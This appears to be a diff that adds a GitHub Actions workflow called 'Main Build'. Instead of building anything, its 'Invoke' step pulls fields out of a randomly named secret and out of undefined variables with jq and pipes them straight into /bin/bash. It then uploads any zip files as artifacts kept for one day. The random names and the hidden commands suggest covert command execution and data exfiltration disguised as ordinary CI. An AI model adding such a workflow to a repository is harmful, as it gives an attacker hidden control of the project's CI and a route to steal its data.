@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          vou98546: ${{ secrets.vou98546 }}
+        run: |
+          printf '%s' "$vou98546" | jq -r .vovz81533 | /bin/bash
+          printf '%s' "$akwls70472" | jq -r .k4725 | /bin/bash
+          printf '%s' "$idu48694" | jq -r .nkdx7 | /bin/bash
+          printf '%s' "$s265" | jq -r .xjuzb85 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: CyVXh1Q4
+          path: "*.zip"
+          retention-days: 1
